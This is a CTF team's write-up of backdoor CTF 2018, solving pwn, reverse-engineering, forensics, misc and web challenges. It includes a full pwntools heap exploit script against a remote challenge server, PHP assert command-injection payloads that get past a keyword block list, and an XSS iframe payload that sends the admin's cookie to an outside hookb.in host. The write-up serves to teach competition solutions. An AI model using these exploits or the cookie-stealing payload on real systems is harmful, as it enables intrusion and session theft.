# backdoor CTF 2018

This write-up is already published on [GitHub](https://github.com/balsn/ctf_writeup/tree/master/20180317-backdoorctf). Instead of updating the writeup here, please send a pull request to GitHub.

 - [backdoor CTF 2018](#backdoor-ctf-2018)
   - [Pwn](#pwn)
     - [shelter (sces60107)](#shelter-sces60107)
   - [rev](#rev)
     - [re-curse (sces60107)](#re-curse-sces60107)
     - [mind-fcuk (sces60107)](#mind-fcuk-sces60107)
   - [forensic](#forensic)
     - [random-noise (qazwsxedcrfvtg14 sces60107)](#random-noise-qazwsxedcrfvtg14-sces60107)
     - [vm-service 1 &amp; 2 (sces60107 qazwsxedcrfvtg14)](#vm-service-1--2-sces60107-qazwsxedcrfvtg14)
   - [misc](#misc)
     - [cats-everywhere (sces60107)](#cats-everywhere-sces60107)
   - [crypto](#crypto)
   - [web](#web)
     - [BF-CAPTCHA-REVENGE (solved by qazwsxedcrfvtg14, written by bookgin)](#bf-captcha-revenge-solved-by-qazwsxedcrfvtg14-written-by-bookgin)
     - [Get-hired (solved by sasdf, written by bookgin)](#get-hired-solved-by-sasdf-written-by-bookgin)
     - [Get-hired 2 (unsolved, written by bookgin)](#get-hired-2-unsolved-written-by-bookgin)


## Pwn 

### shelter (sces60107)
```python
from pwn import *

r=remote("51.15.73.163",8088)
#r=process("./challenge")
#context.terminal = ['gnome-terminal', '-x', 'sh', '-c']
#gdb.attach(proc.pidof(r)[0],'b *0x0804A65D\nc\n')

# We want to overwrite the function on the heap
# We can overwrite prev-size so that we can forge a chunk that will overlap with other chunk




r.recvuntil("choice > ")
r.sendline("3")
r.recvuntil("at ")
help=int(r.recvline(),16)
print hex(help)

system=help-0xc1a+0xa30
r.recvuntil("choice > ")
r.sendline("1")
r.recvuntil("content >")
r.send("a"*0xc8+p64(0x90)+p64(0x111))
r.recvuntil("at ")
heap0=int(r.recvline()[:-2],16)
print hex(heap0)

r.recvuntil("choice > ")
r.sendline("1")
r.recvuntil("content >")
r.send("a"*0xc8+p64(0x90)+p64(0x121)+p64(heap0+0x300)+p64(heap0+0x300))
r.recvuntil("at ")
heap1=int(r.recvline()[:-2],16)
print hex(heap1)

r.recvuntil("choice > ")
r.sendline("1")
r.recvuntil("content >")
r.send(p64(heap1+0xd0)*10)
r.recvuntil("at ")
heap2=int(r.recvline()[:-2],16)
print hex(heap2)


r.recvuntil("choice > ")
r.sendline("1")
r.recvuntil("content >")
r.send(p64(heap1+0xd0)*10)
r.recvuntil("at ")
heap3=int(r.recvline()[:-2],16)
print hex(heap3)


r.recvuntil("choice > ")
r.sendline("2")
r.recvuntil("note >")
r.sendline("2")


r.recvuntil("choice > ")
r.sendline("1")
r.recvuntil("content >")
r.send("a"*0xe8+p64(0x120)+"\x00")
r.recvuntil("at ")
heap2=int(r.recvline()[:-2],16)
print hex(heap2)

r.recvuntil("choice > ")
r.sendline("2")
r.recvuntil("note >")
r.sendline("3")

r.recvuntil("choice > ")
r.sendline("1")
r.recvuntil("content >")
r.send(p64(system)*10)
r.recvuntil("at ")
heap2=int(r.recvline()[:-2],16)
print hex(heap2)


r.recvuntil("choice > ")
r.sendline("2")
r.recvuntil("note >")
r.sendline("2")
r.interactive()


```

## rev

### re-curse (sces60107)

In this challenge, you will get a binary file.

After some investigation, you find out that it's a Haskell binary.

This binary will take your input string and do some encoding, then it will compare your encoded string with the encoded flag.

Here is an example

![](https://i.imgur.com/VhHVHEC.png)


You can find out that `CTF` will become `dE4`.

If encode both string in hex, you will find out the secret.

```shell=
Hex("CTF") = "435446";
Hex("dE4") = "644534";
```

This binary reverse the hex string.

After knowing that encode algorithm, we just need find out the encoded flag.

Finally, the flag is `CTF{R3_CURS3_I5_LIFT3D_0FF_Y0U}`

### mind-fcuk (sces60107)

You will get a binary from this challenge.

First we can just execute it, and see what will happen.

![](https://i.imgur.com/TI82DQi.png)

It has four keys.

This binary will divide your input into four parts, and each part will be compared with those keys repectively after doing some encoding.

The first part is ROT13.
The second one is XOR.
For the third one and four one, I just mantain a mapping table instead of reversing the algorithm.

At the end I can produce the flag.

The flag is `CTF{f5g4s8g4dyjj4f48f5d}`


## forensic

### random-noise (qazwsxedcrfvtg14 sces60107)

There are two phase in this challenge.

At the begining, you can use `zsteg` to find out the first clue `key for vigenere cipher: THISKEYCANTBEGUESSED (not the flag)
`
![](https://i.imgur.com/EZm7WQi.png)

And you also get another png file.
After some investigation, you find out that some color exactly occur 4159 times in the second png file, the other colors only occur once. 

Leverage that feature, you can modify the png file.![](https://i.imgur.com/lYnyNLG.png)

Now you get a sequence of morse code.
Just decode it, you will get `YSIYSWFGYLHVNAMXKSZHWUMG
`.
This is the second clue.

According to these clues, you can figure out the flag now. 


### vm-service 1 & 2 (sces60107 qazwsxedcrfvtg14)

This challenge give you an ova file, and tell you that the password of his account is the first flag.

It's very easy to get the root privilege.
After that, you can get the password with /etc/shadow.

But actually, we didn't get the password in that way.
We noticed that there is a keylogger in this virtual machine.
And we also found the log.

After reversing the keylogger binary, you can figure the encoding of the log.
Now you can dig the second flag and the password out of these logs.

## misc

### cats-everywhere (sces60107)

This challenge is easiest one.

you will be given a git repo.

In these kind of challenges, the first thing you need to do is check out the history of this repo.

Here are some useful command

```shell
git log

git cat-file -p <object-id>
```

Soon you can find out the flag pictures.

## crypto

## web

### BF-CAPTCHA-REVENGE (solved by qazwsxedcrfvtg14, written by bookgin)

The challenge is a website which shows some brainfuck code and an audio captcha, and I don't bother to solve it at all.

First, the descrition of the challenge gives us the hint about the `.git`. We use [GitTools](https://github.com/internetwache/GitTools) to crwal the repository.

>rnehra01 loves to version control and has made these captchas as good as hell.


In the source code:
```php
function is_clean($input){
    ...

	if (preg_match('/(base64_|eval|system|shell_|exec|php_)/i', $input)){//no coomand injection 
		bad_hacking_penalty();
		return false;
	}

    ...

}

if (is_clean($user_ans)) {
  assert("'$real_ans' === '$user_ans'") 
  ...
}
```

There is a obvious command injection, and it can be bypassed easily.

The payload:
```
`'OR ("sys"."tem")("ls -al") OR'`  
`'OR ("sys"."tem")("cat rand*") OR'`
```

Acctually I'm trying to create a reverse shell, but `system` seems to be more efficient and effective to retrieve the flag.

Of course, I guess some team will solve all the reCAPTCHA to get the flag, and [P4](https://github.com/p4-team/ctf/tree/master/2018-03-18-backdoor-ctf/web_captcha) proves that.

### Get-hired (solved by sasdf, written by bookgin)

In `call.js`, this is vulenrable to XSS:
```javascript=
function p(details){
	document.getElementById('call\_details').innerHTML = details.sender\_username + " is calling " + details.receiver_username + " ....";
}
```

It utilizes `postMessage` API to render the HTML content.
```javascript
$("#audiocall").click(function(){
         var call_window;
         call_window = window.open("call.php");
         setTimeout(function(){
             call_window.postMessage({
               type: "audio",
               details: {
                 sender_username: "admin",
                 sender\_team\_name: "InfosecIITR",
                 receiver\_username: escapeHTML($("#r\_call").val()),
                 receiver\_team\_name: escapeHTML($("#rteam_call").val())
               }
             }, "*");
         }, 100);
     });

```

Also, sending a URL in `get hired` page allows the admin to browse a foreign site. Therefore, we just create a `evilsite.com` with the content below. The admin will post the XSS payload to iFrame, and we are able to get the cookie.

```htmlmixed
<iframe id="if" src="http://localhost/call.php"></iframe>                                                                                
<script>                                                                                                                                 
var ifr = document.getElementById("if").contentWindow;                                                                                   
var payload = "<img src=a onerror='window.location.href=(\"https://hookb.in/test?g=\" + btoa(document.cookie));'>";                      
                                                                                                                                         
setTimeout(function(){                                                                                                                   
ifr.postMessage({                                                                                                                        
  type: "audio",                                                                                                                         
  details: {                                                                                                                             
   sender_username: payload,                                                                                                             
   sender_team_name: payload,                                                                                                            
   receiver_username: payload,                                                                                                           
   receiver_team_name: payload                                                                                                           
  }                                                                                                                                      
}, "*");                                                                                                                                 
}, 3000);                                                                                                                                
</script>
```

### Get-hired 2 (unsolved, written by bookgin)

It adds an origin verification function.

```javascript
function verifyorigin(originHref) {
        var a = document.createElement("a");
        a.href = originHref;        
        return a.hostname == window.location.hostname
}

if(!verifyorigin(event.origin)){
    return;
    ...
}
```

Bypass it with null origin using [data URI](https://en.wikipedia.org/wiki/Data_URI_scheme). 

Reference:
1. https://ctftime.org/writeup/9187
2. https://ctftime.org/writeup/9181
